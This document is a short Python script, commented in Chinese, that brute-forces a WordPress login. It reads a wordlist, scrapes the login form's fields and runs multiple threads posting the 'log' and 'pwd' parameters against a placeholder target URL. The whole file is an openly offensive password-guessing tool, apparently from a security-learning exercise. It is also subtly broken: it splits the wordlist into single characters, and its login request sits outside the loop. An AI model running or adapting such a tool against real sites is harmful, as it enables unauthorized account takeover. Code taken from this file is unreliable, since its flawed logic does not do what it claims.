from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'
TARGET = 'http://xxx'
WORDLISTT = './all.txt'
THREADS = 10

# 把文件中的word放入到队列中
def get_words():
    with open(WORDLISTT) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words:
        words.put(word)
    return words

# 生成表中原有的参数
def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'Brute Force Attack beginning on {url}')
        print(f'Finished the setup where username is {username}')

    def run_bruterforce(self, passwords):
        for _ in range(THREADS):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()  # 自动处理好cookie
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username
        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

        resp1 = session.post(self.url, data=params)
        if SUCCESS in resp1.text:
            self.found = True
            print(f'Bruteforcing successful.')
            print(f'Username is {self.username}')
            print(f'Password is {params["pwd"]}')

